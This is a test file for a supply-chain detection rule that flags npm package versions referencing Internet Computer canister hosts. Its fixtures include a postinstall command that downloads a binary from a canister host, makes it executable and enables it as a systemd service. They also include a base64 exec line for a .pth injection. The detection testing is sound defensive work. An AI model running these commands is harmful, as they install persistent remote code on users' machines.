"""H3 supply-chain references: package version plus an IC reference; neither alone."""

from datetime import UTC, datetime
from itertools import count
from typing import Any

import pytest

from icp_threat_intel.core.enums import SourceType
from icp_threat_intel.core.interfaces import Rule
from icp_threat_intel.core.models import Event
from icp_threat_intel.core.trust import default_reliability
from icp_threat_intel.rules.engine import run_rules
from icp_threat_intel.rules.h3_supply_chain import H3SupplyChainReference, ic_references

RULE = H3SupplyChainReference()
PKG = "npm:@opengov/form-renderer@0.2.20"
_ids = count(1000)
# ThreatFox 1781006 shape; strings are data for pattern matching only.
POSTINSTALL = (
    "curl -s https://tdtqy-oyaaa-aaaae-af2dq-cai.raw.icp0.io/ -o /tmp/pglog && "
    "chmod +x /tmp/pglog && systemctl --user enable pgmon.service"
)


def _pkg_event(kind: str, payload: dict[str, Any], subject: str = PKG) -> Event:
    return Event(
        id=next(_ids),
        kind=kind,
        subject_type="package",
        subject_id=subject,
        observed_at=datetime(2026, 4, 4, 11, 52, tzinfo=UTC),
        source_type=SourceType.NPM,
        parser="synthetic@1",
        weight=default_reliability(SourceType.NPM),
        payload=payload,
    )


def _published(subject: str = PKG) -> Event:
    return _pkg_event("package.version_published", {"version": "0.2.20"}, subject)


def _reference(text: str, location: str = "postinstall", subject: str = PKG) -> Event:
    return _pkg_event("package.canister_reference", {"location": location, "text": text}, subject)


def test_rule_contract() -> None:
    assert isinstance(RULE, Rule)
    assert RULE.id == "H3" and RULE.required_signals == {"registry_artifact", "ic_reference"}
    doc = H3SupplyChainReference.__doc__ or ""
    assert "CanisterWorm" in doc and "1781006" in doc and "CanisterSprawl" in doc


def test_positive_threatfox_1781006_shape() -> None:
    published, reference = _published(), _reference(POSTINSTALL)
    detection = RULE.score([published, reference])
    assert detection is not None
    assert detection.subject_type == "package" and detection.subject_id == PKG
    assert detection.canister_id is None
    assert detection.score == pytest.approx(1.0)
    for needle in (
        "tdtqy-oyaaa-aaaae-af2dq-cai",
        "tdtqy-oyaaa-aaaae-af2dq-cai.raw.icp0.io",
        "/tmp/pglog",
        "pgmon.service",
        "postinstall",
    ):
        assert needle in detection.explanation
    assert {r.id for r in detection.evidence_refs} == {published.id, reference.id}


@pytest.mark.parametrize(
    ("text", "key", "value"),
    [
        ("const c = 'cjn37-uyaaa-aaaac-qgnva-cai'", "canister_ids", "cjn37-uyaaa-aaaac-qgnva-cai"),
        ("fetch('https://icp-api.io/api/v3/canister/x/query')", "gateway_hosts", "icp-api.io"),
        ("u='https://abc.ic0.app/'", "gateway_hosts", "abc.ic0.app"),
        ("host = 'raw.icp0.io'", "gateway_hosts", "raw.icp0.io"),
        ("cp x /tmp/pglog", "host_indicators", "/tmp/pglog"),
        ("Unit: pgmon.service", "host_indicators", "pgmon.service"),
        (
            "~/.config/systemd/user/updater.service",
            "host_indicators",
            ".config/systemd/user/updater.service",
        ),
    ],
)
def test_each_reference_kind_matches(text: str, key: str, value: str) -> None:
    assert value in ic_references(text)[key]
    assert RULE.score([_published(), _reference(text)]) is not None


@pytest.mark.parametrize(
    "text",
    [
        "https://example.com/icp0.io.html",  # not a host suffix match
        "evil-icp0.io.example.net",
        "tdtqy-oyaaa-aaaae-af2dq-caix",  # not a whole canister ID
        "/tmp/pglogger",
        "nothing interesting here",
        "see docs/icp0.io for details",
        "ic0.app.evil.example",
    ],
)
def test_non_references(text: str) -> None:
    assert RULE.score([_published(), _reference(text)]) is None


def test_pth_injection_from_texts_list() -> None:
    pth = "import os,base64;exec(base64.b64decode('...'))  # cjn37-uyaaa-aaaac-qgnva-cai"
    reference = _pkg_event("package.canister_reference", {"location": ".pth", "texts": [pth, 7]})
    detection = RULE.score([_published(), reference])
    assert detection is not None and ".pth" in detection.explanation
    assert detection.score == pytest.approx(0.9)


def test_negative_registry_artifact_alone() -> None:
    assert RULE.score([_published()]) is None


def test_negative_reference_alone() -> None:
    assert RULE.score([_reference(POSTINSTALL)]) is None


def test_reference_without_location_scores_lower() -> None:
    reference = _pkg_event("package.canister_reference", {"text": "tdtqy-oyaaa-aaaae-af2dq-cai"})
    detection = RULE.score([_published(), reference])
    assert detection is not None and detection.score == pytest.approx(0.8)


def test_package_versions_are_separate_subjects() -> None:
    other = "npm:@opengov/form-renderer@0.2.19"
    events = [_published(other), _reference(POSTINSTALL), _published()]
    assert [d.subject_id for d in run_rules([RULE], events)] == [PKG]
